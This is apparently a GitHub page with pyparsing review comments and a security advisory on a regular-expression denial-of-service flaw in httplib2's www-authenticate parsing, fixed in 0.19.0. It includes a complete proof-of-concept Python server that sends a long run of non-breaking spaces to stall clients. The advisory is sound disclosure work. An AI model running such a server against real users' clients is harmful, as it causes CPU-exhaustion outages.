Copy link    Quote reply     @ptmcg **[ptmcg](/ptmcg)** [Mar 27, 2021](#r48788453) Contributor   pyparsing is not exactly fast. I believe you would get better performance using a `pp.Word('=')` in place of the `pp.ZeroOrMore("=")` . Note that this *will* use a regex internally. Also, pyparsing's whitespace skipping will accept token68's that look like "0 = = =". If that is not permissable, then use leaveWhitespace() on the second term in this expression (either ZeroOrMore or Word).     👍 1  temoto reacted with thumbs up emoji   All reactions  * 👍   1 reaction         This comment has been minimized.

I *think* you will get suitable and slightly better behavior if you use `(params("params") | token68("token"))` instead. (Depends on how often you get a params in the input string).

I'm glad pyparsing was useful to you in resolving this. I had to fix similar regex parsing issues (runaway backtracking) in some of pyparsing's internal regexen, so I can definitely empathize!

Sorry, something went wrong.

Mean improvement on realistic and synthetic complex headers is around 50%. Thank you very much.

# Regular Expression Denial of Service (REDoS) in httplib2

Moderate

[temoto](/temoto)
published
GHSA-93xj-8mrv-444m
Feb 8, 2021

## Package

httplib2
(pypi)

## Affected versions

<= 0.18.1

## Patched versions

0.19.0

## Description

### Impact

A malicious server which responds with long series of `\xa0` characters in the `www-authenticate` header may cause Denial of Service (CPU burn while parsing header) of the httplib2 client accessing said server.

### Patches

Version 0.19.0 contains new implementation of auth headers parsing, using pyparsing library.

[#182](https://github.com/httplib2/httplib2/pull/182)

### Workarounds

```
import httplib2
httplib2.USE_WWW_AUTH_STRICT_PARSING = True
```
### Technical Details

The vulnerable regular expression is

[httplib2/python3/httplib2/\_\_init\_\_.py](https://github.com/httplib2/httplib2/blob/595e248d0958c00e83cb28f136a2a54772772b50/python3/httplib2/__init__.py#L336-L338)

Lines 336 to 338
in
[595e248](/httplib2/httplib2/commit/595e248d0958c00e83cb28f136a2a54772772b50)

|  | WWW\_AUTH\_RELAXED = re.compile( |
| --- | --- |
|  | r"^(?:\s\*(?:,\s\*)?([^ \t\r\n=]+)\s\*=\s\*\"?((?<=\")(?:[^\\\"]|\\.)\*?(?=\")|(?<!\")[^ \t\r\n,]+(?!\"))\"?)(.\*)$" |
|  | ) |

The section before the equals sign contains multiple overlapping groups. Ignoring the optional part containing a comma, we have:

```
\s*[^ \t\r\n=]+\s*=

```

Since all three infinitely repeating groups accept the non-breaking space character `\xa0`, a long string of `\xa0` causes catastrophic backtracking.

The complexity is cubic, so doubling the length of the malicious string of `\xa0` makes processing take 8 times as long.

### Reproduction Steps

Run a malicious server which responds with

```
www-authenticate: x \xa0\xa0\xa0\xa0x

```

but with many more `\xa0` characters.

An example malicious python server is below:

```
from http.server import BaseHTTPRequestHandler, HTTPServer

def make_header_value(n_spaces):
    repeat = "\xa0" * n_spaces
    return f"x {repeat}x"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.log_request(401)
        self.send_response_only(401)  # Don't bother sending Server and Date
        n_spaces = (
            int(self.path[1:])  # Can GET e.g. /100 to test shorter sequences
            if len(self.path) > 1 else
            65512  # Max header line length 65536
        )
        value = make_header_value(n_spaces)
        self.send_header("www-authenticate", value)  # This header can actually be sent multiple times
        self.end_headers()

if __name__ == "__main__":
    HTTPServer(("", 1337), Handler).serve_forever()
```

Connect to the server with httplib2:

```
import httplib2
httplib2.Http(".cache").request("http://localhost:1337", "GET")
```

To benchmark performance with shorter strings, you can set the path to a number e.g. <http://localhost:1337/1000>
